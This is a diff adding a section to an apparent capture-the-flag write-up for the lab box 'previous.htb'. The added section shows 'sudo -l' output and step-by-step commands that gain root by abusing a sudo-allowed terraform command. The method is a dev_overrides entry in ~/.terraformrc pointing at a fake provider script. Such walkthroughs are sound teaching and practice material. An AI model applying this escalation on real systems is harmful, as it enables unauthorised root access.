@@ -130,9 +130,51 @@ secret: process.env.NEXTAUTH_SECRET
 
 ## Local enumeration
 
+```sh
+jeremy@previous:~$ sudo -l
+[sudo] password for jeremy: 
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+
+```
 ## Privilege Escalation vector
 
+### Terraform
+it need providers so it can know how to execute and those providers are just binaries, 
+
+---
+
+### 1. Pick a directory you control
+```
+mkdir -p /home/jeremy/fake_provider
+```
+
+2. Update your `~/.terraformrc`
+Change the dev override to point at your directory instead of `/usr/local/go/bin`.
+```
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/home/jeremy/fake_provider"
+  }
+  direct {}
+}
+
+```
+
+3. put  a provider binary in your directory
+```
+touch /home/jeremy/fake_provider/terraform-provider-examples
+chmod +x /home/jeremy/fake_provider/terraform-provider-examples
+
+echo '#!/bin/sh' > /home/jeremy/fake_provider/terraform-provider-examples
+echo 'echo "Custom provider executed as: $(id)"' >> /home/jeremy/fake_provider/terraform-provider-examples
+chmod +x /home/jeremy/fake_provider/terraform-provider-examples
+
+sudo /usr/bin/terraform -chdir=/opt/examples apply
+```
 
 ---
 
